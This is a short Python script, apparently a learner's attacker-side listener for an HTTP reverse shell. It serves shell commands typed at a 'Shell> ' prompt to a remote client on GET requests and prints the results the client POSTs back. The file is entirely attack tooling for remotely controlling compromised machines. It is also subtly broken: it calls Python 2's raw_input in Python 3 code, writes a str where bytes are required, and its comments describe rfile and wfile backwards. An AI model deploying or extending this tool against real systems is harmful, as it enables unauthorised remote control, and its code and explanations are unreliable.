# rev-server.py                               

import requests
import http.server
"""handler for URL patterns (respond to GETs, POSTs)
 http.server's BaseHTTPRequestHandler must be subclassed to handle GET/POST why say that? It means we are subclassing to a custom request_handler! 
Default response to server is text/html
 Length of response is accessed via headers
 rfile contains output stream
 wfile contains input stream
"""

class request_handler(http.server.BaseHTTPRequestHandler):
   def do_GET(sf): # sf is "self"
     # ask for input from client
     remote_cmd = raw_input("Shell> ")
     # send hey! I got your request to client
     sf.send_response(200)
     # no more headers
     sf.end_headers()
     # write the response to the client
     sf.wfile.write(remote_cmd)
   def do_POST(sf):
     sf.send_response(200)
     sf.end_headers()
     # read to the end 
     len_headers = int(sf.headers['Content-length'])
     #len_headers = int(sf.headers.getheader('content-length'))
     remote_cmd = sf.rfile.read(len_headers)
     # show what the client typed
     print(remote_cmd)

"""
http.server.HTTPServer is a subclass of SocketServer.TCPServer
meaning a new server instance listens at the HTTP socket.
"""
if __name__ == '__main__':
  server_class = http.server.HTTPServer
  handler_class = request_handler
  server_addr = ("127.0.0.1", 80)
  # run httpd daemon
  httpd = server_class(server_addr, handler_class)
  # run httpd daemon persistently
  try:
    httpd.serve_forever()
  # release socket listener
  except KeyboardInterrupt:
    httpd.server_close()
